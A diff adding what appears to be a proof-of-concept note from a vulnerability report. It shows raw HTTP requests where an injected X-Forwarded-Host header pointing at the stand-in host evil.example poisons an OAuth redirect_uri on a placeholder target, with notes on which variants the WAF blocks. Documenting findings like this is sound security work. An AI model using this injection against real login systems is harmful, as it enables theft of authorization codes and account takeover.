@@ -1,0 +1,24 @@
+# 基线（无伪造头）
+GET /portal/api/basic-function/regions HTTP/1.1
+Host: TARGET
+
+# -> 401
+# Location: https://sso.example.com/siam/oauth2.0/authorize?client_id=APPID
+#   &redirect_uri=https://TARGET/portal/api/v1/sso/callback
+#   &state=https%3A%2F%2FTARGET%2F&response_type=code
+
+# 注入（只加一个头）
+GET /portal/api/basic-function/regions HTTP/1.1
+Host: TARGET
+X-Forwarded-Host: evil.example
+
+# -> 401
+# Location: ...&redirect_uri=https://evil.example/portal/api/v1/sso/callback
+#              &state=https%3A%2F%2Fevil.example%2F...
+
+# Reference: only a syntactically valid hostname is accepted.
+#   X-Forwarded-Host: evil.example/foo?x=1        -> NOT reflected (falls back)
+#   X-Forwarded-Host: target@evil.example         -> NOT reflected
+#   Host: evil.example (direct)                   -> edge 404 (vhost not matched)
+#   Referer: javascript:... / data:...            -> WAF 412
+# Control: /portal/api/v1/sso/logout returns a hardcoded service= even with XFH set.
